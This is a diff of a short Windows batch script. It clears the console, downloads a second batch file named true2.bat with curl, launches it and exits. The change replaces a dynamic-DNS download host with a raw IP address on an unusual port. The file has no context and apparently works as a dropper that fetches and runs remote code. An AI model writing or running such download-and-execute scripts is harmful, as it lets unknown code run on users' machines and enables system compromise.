@@ -1,6 +1,6 @@
 @echo off
 cls
-curl -O http://pawarit7.sytes.net/True/true2.bat
+curl -O http://49.228.131.69:3661/True/true2.bat
 cls
 start true2.bat
 exit
